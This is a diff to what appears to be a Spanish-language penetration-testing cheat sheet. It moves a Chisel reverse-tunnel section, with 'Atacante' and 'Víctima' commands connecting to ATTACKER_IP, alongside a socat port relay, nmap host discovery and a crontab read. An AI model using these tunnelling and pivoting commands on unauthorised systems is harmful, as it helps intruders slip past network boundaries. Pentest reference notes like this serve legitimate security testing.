@@ -33,8 +33,22 @@ nmap -sn network/address
 wget https://raw.githubusercontent.com/CronoX1/Host-Discovery/main/Host-Discovery.py
 ```
 #### Port Forwarding
+
+### Socat
+
 ```
 socat TCP-LISTEN:LISTENNING_PORT,fork sctp:REMOTE_IP:REMOTE_PORT
+```
+### Chisel
+
+Atacante
+```
+./chisel server --reverse -p ATACKER_PORT
+```
+
+Víctima
+```
+./chisel client ATTACKER_IP:ATTACKER_PORT R:VICTIM_IP:VICTIM_PORT
 ```
 #### Domain Zone Transfer (AXFR)
 ```
@@ -309,17 +323,7 @@ Tareas programadas
 cat /etc/crontab
 ```
 
-### Chisel
 
-Atacante
-```
-./chisel server --reverse -p ATACKER_PORT
-```
-
-Víctima
-```
-./chisel client ATTACKER_IP:ATTACKER_PORT R:VICTIM_IP:VICTIM_PORT
-```
 
 ### PEASS-ng
 ```
